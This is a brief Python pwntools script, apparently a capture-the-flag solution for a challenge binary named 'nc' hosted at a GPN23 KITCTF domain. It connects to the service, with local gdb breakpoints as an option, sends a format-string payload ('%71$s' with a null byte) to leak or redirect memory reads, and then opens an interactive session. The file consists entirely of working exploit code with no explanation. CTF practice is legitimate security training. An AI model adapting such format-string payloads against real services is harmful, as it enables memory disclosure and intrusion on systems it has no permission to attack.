#!/usr/bin/env python3

from pwn import *

exe = ELF("./nc")

context.binary = exe

gdb_script = '''
    b *main+545
    b *main+513
    c
'''
def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("springside-of-forceful-commerce.gpn23.ctf.kitctf.de", "443", ssl=True)

    return r


def main():
    
    r = conn()
    
    r.sendlineafter(b"to read\n", f"%71$s\00".encode())
    r.recvuntil(b"Will open:\n")

    r.interactive()


if __name__ == "__main__":
    main()
